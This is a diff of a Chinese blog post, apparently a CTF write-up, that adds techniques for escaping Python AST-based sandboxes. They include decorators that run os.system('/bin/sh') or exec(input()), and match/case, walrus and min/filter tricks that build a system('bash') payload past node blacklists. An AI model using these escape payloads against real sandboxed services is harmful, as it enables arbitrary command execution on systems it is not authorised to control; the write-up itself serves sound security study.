@@ -355,7 +355,7 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
 <h3 id="without-call">without call</h3>
 <p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
 <h4 id="装饰器">装饰器</h4>
-<p>利用 payload 如下:</p>
+<p>利用 payload 如下，乍一看可能有些迷惑，但该 payload 实际上等效于 exec(input(X))</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@exec</span>
 <span class="nd">@input</span>
 <span class="k">class</span> <span class="nc">X</span><span class="p">:</span>
@@ -371,7 +371,7 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
 </span></code></pre></div></div>
 <p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
 
-<p>其实这样的话,构造其实可以有很多,比如直接打开 help 函数.</p>
+<p>其实这样的话,构造其实可以有很多,比如使用单层的装饰器，打开 help 函数.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@help</span>
 <span class="k">class</span> <span class="nc">X</span><span class="p">:</span>
     <span class="k">pass</span>
@@ -391,9 +391,37 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
 </code></pre></div></div>
 <p>再次输入 !sh 即可打开 /bin/sh</p>
 
+<p>或是给装饰器加一些参数。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="k">def</span> <span class="nf">fake_wrapper</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+  <span class="k">return</span> <span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span>
+
+<span class="nd">@getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
+<span class="nd">@fake_wrapper</span>
+<span class="k">def</span> <span class="nf">something</span><span class="p">():</span>
+  <span class="k">pass</span>
+</code></pre></div></div>
+<p>相当于：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getattr<span class="o">(</span>os,<span class="s2">"system"</span><span class="o">)(</span>fake_wrapper<span class="o">(</span>something<span class="o">))</span>
+</code></pre></div></div>
+
+<p>亦或者自定义一个装饰器：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="k">def</span> <span class="nf">fake_wrapper</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+  <span class="k">return</span> <span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span>
+
+<span class="nd">@os.system</span>
+<span class="nd">@fake_wrapper</span>
+<span class="k">def</span> <span class="nf">something</span><span class="p">():</span>
+  <span class="k">pass</span>
+</code></pre></div></div>
+<p>相当于 os.system(fake_wrapper(something))，也就是 os.system(‘/bin/sh’)</p>
+
 <h4 id="函数覆盖">函数覆盖</h4>
 
-<p>我们知道在 Python 中获取一个的属性例如 <code class="language-plaintext highlighter-rouge">obj[argument]</code> 实际上是调用的 <code class="language-plaintext highlighter-rouge">obj.__getitem__</code> 方法.因此我们只需要覆盖其 <code class="language-plaintext highlighter-rouge">__getitem__</code> 方法, 即可在使用 <code class="language-plaintext highlighter-rouge">obj[argument]</code> 执行代码:</p>
+<p>我们知道在 Python 中获取一个的属性例如 <code class="language-plaintext highlighter-rouge">obj[argument]</code> 实际上是调用的 <code class="language-plaintext highlighter-rouge">obj.__getitem__</code> 方法.因此只需要覆盖其 <code class="language-plaintext highlighter-rouge">__getitem__</code> 方法, 即可在使用 <code class="language-plaintext highlighter-rouge">obj[argument]</code> 执行代码:</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">A</span><span class="p">:</span>
 <span class="p">...</span>     <span class="n">__getitem__</span> <span class="o">=</span> <span class="k">exec</span>
 <span class="p">...</span> 
@@ -509,6 +537,187 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
     <span class="k">pass</span>
 </code></pre></div></div>
 
+<h3 id="绕过-astattribute-获取属性">绕过 ast.Attribute 获取属性</h3>
+<p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>
+
+<p>最简单的示例，匹配字符串：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="mi">2</span>
+
+<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
+    <span class="n">case</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">One</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">case</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Two</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Two
+</span></code></pre></div></div>
+<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
+    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AClass</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">thing</span> <span class="o">=</span> <span class="n">value</span>
+
+<span class="n">item</span> <span class="o">=</span> <span class="nc">AClass</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+
+<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
+    <span class="n">case</span> <span class="nc">AClass</span><span class="p">(</span><span class="n">thing</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Got </span><span class="si">{</span><span class="n">x</span> <span class="o">=</span> <span class="si">}</span><span class="s">!</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Got x = 32!
+</span></code></pre></div></div>
+<p>在这个示例中，重点关注<code class="language-plaintext highlighter-rouge">case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>
+
+<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code class="language-plaintext highlighter-rouge">''.__class__</code>，可以编写如下的 match/case 语句：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">str</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>
+
+<span class="c1"># True
+</span></code></pre></div></div>
+<p>可以看到 x 就是 <code class="language-plaintext highlighter-rouge">''.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>
+
+<span class="c1"># True
+</span></code></pre></div></div>
+
+<p>再测试一下该 payload 的 AST：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">ast</span> 
+
+<span class="n">a</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+match str():
+    case str(__class__=x):
+        print(x)
+</span><span class="sh">'''</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="sh">'</span><span class="s">exec</span><span class="sh">'</span><span class="p">),</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
+</code></pre></div></div>
+<p>AST 如下：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
+    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
+        <span class="nc">Match</span><span class="p">(</span>
+            <span class="n">subject</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
+                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
+                <span class="n">args</span><span class="o">=</span><span class="p">[],</span>
+                <span class="n">keywords</span><span class="o">=</span><span class="p">[]),</span>
+            <span class="n">cases</span><span class="o">=</span><span class="p">[</span>
+                <span class="nf">match_case</span><span class="p">(</span>
+                    <span class="n">pattern</span><span class="o">=</span><span class="nc">MatchClass</span><span class="p">(</span>
+                        <span class="n">cls</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
+                        <span class="n">patterns</span><span class="o">=</span><span class="p">[],</span>
+                        <span class="n">kwd_attrs</span><span class="o">=</span><span class="p">[</span>
+                            <span class="sh">'</span><span class="s">__class__</span><span class="sh">'</span><span class="p">],</span>
+                        <span class="n">kwd_patterns</span><span class="o">=</span><span class="p">[</span>
+                            <span class="nc">MatchAs</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)]),</span>
+                    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
+                        <span class="nc">Expr</span><span class="p">(</span>
+                            <span class="n">value</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
+                                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">print</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
+                                <span class="n">args</span><span class="o">=</span><span class="p">[</span>
+                                    <span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">())],</span>
+                                <span class="n">keywords</span><span class="o">=</span><span class="p">[]))])])],</span>
+    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
+</code></pre></div></div>
+<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
+
+<p>我们可以构造替代 <code class="language-plaintext highlighter-rouge">''.__class__.__base__.__subclasses__()</code>的 payload：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
+        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
+            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__base__</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
+                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
+                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__subclasses__</span><span class="o">=</span><span class="n">subclazz</span><span class="p">):</span>
+                        <span class="nf">print</span><span class="p">(</span><span class="n">subclazz</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="绕过-astassign-赋值变量">绕过 ast.Assign 赋值变量</h3>
+<p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>
+    <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="mi">111</span><span class="p">,</span>
+    <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="mi">222</span>
+<span class="p">]</span>
+</code></pre></div></div>
+<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
+    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
+        <span class="nc">Expr</span><span class="p">(</span>
+            <span class="n">value</span><span class="o">=</span><span class="nc">List</span><span class="p">(</span>
+                <span class="n">elts</span><span class="o">=</span><span class="p">[</span>
+                    <span class="nc">NamedExpr</span><span class="p">(</span>
+                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
+                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">111</span><span class="p">)),</span>
+                    <span class="nc">NamedExpr</span><span class="p">(</span>
+                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">bash</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
+                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">222</span><span class="p">))],</span>
+                <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()))],</span>
+    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astconstant-获取数字字符串">绕过 ast.Constant 获取数字、字符串</h3>
+<p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。
+例如：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">""</span> <span class="p">:</span> <span class="nf">str</span><span class="p">()</span>
+<span class="mi">0</span>  <span class="p">:</span> <span class="nf">len</span><span class="p">([])</span>
+<span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([]))</span>
+<span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">或</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">]))</span>
+<span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">(),</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">或</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">max</span><span class="p">]))</span>
+<span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">:</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">])</span><span class="o">*</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">]))</span>
+</code></pre></div></div>
+<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
+
+<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>
+
+<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>那么就可以通过下面的方式获取到这几个字符串：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>list<span class="o">(</span>dict<span class="o">(</span><span class="nv">system</span><span class="o">=[]))[</span>0]            <span class="c"># system</span>
+list<span class="o">(</span>dict<span class="o">(</span><span class="nv">_wrap_close</span><span class="o">=[]))[</span>0]       <span class="c"># _wrap_close</span>
+list<span class="o">(</span>dict<span class="o">(</span><span class="nv">bash</span><span class="o">=[]))[</span>0]              <span class="c"># bash</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astsubscript-获取列表字典元素">绕过 ast.Subscript 获取列表/字典元素</h3>
+<p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[])))</span>            <span class="c1"># system
+</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))</span>       <span class="c1"># _wrap_close
+</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>              <span class="c1"># bash
+</span></code></pre></div></div>
+
+<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
+        <span class="nf">get_func</span><span class="p">(</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astfor-遍历列表">绕过 ast.For 遍历列表</h3>
+<p>在构造最终 payload 中，我们还需要在 <code class="language-plaintext highlighter-rouge">__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
+    <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
+    <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
+        <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">name_</span><span class="err">＿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">subclazzes_item</span>
+<span class="p">[</span>
+    <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
+<span class="p">]</span>
+</code></pre></div></div>
+<p>fitler 中使用 match/case 和 if 来进行过滤。</p>
+
+<p>除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
+
 <h2 id="参考资料">参考资料</h2>
 <ul>
   <li><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals">Python沙箱逃逸小结</a></li>
@@ -524,6 +733,9 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
   <li><a href="https://ctftime.org/writeup/28286">HAXLAB — Endgame Pwn</a></li>
   <li><a href="https://ctftime.org/writeup/28286">Python沙箱逃逸的n种姿势</a></li>
   <li><a href="https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html">hxp2020-audited</a></li>
+  <li><a href="https://domdom.tistory.com/entry/GoogleCTF2022-TREEBOX-Writeup%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4">[GoogleCTF2022] TREEBOX Writeup</a></li>
+  <li><a href="https://qiita.com/kusano_k/items/3d90a59b6d048497e3c7#treebox">Google CTF 2022 文章 #CTF - Qiita</a></li>
+  <li><a href="https://henryiii.github.io/level-up-your-python/notebooks/2.8%20Pattern%20Matching.html">13. Structural Pattern Matching (Python 3.10+) — Level Up Your Python</a></li>
 </ul>
 </div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-05-30T18:23:57+08:00"><!-- start custom article footer snippet -->
 
